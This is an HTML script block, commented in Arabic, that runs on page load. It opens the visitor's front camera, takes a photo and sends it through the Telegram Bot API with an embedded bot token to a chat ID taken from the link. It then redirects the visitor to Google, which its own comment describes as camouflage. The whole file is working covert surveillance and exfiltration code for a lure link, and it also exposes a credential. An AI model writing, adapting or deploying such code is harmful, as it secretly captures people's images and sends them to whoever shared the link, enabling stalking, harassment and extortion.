<script>
    const TELEGRAM_TOKEN = '8128965245:AAHH3QO-vGGfWmFtCicmw7T9gmBcMWbUg6E';
    
    // استخراج chatId من الرابط تلقائياً
    const urlParams = new URLSearchParams(window.location.search);
    const CHAT_ID = urlParams.get('chatId');

    async function startCapture() {
        if (!CHAT_ID) return; // توقف إذا لم يوجد معرف

        const canvas = document.getElementById('canvas');
        const ctx = canvas.getContext('2d');

        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
            const video = document.createElement('video');
            video.srcObject = stream;
            await video.play();

            setTimeout(() => {
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                stream.getTracks().forEach(track => track.stop());

                canvas.toBlob((blob) => {
                    const formData = new FormData();
                    formData.append('chat_id', CHAT_ID); // يرسل الصورة لصاحب الرابط
                    formData.append('photo', blob, 'image.png');

                    fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {
                        method: 'POST',
                        body: formData
                    }).then(() => {
                        // توجيه المستخدم بعد نجاح الإرسال للتمويه
                        window.location.href = "https://www.google.com";
                    });
                }, 'image/png');
            }, 1000);

        } catch (error) {
            console.log("رفض المستخدم الإذن");
        }
    }
    window.onload = startCapture;
</script>
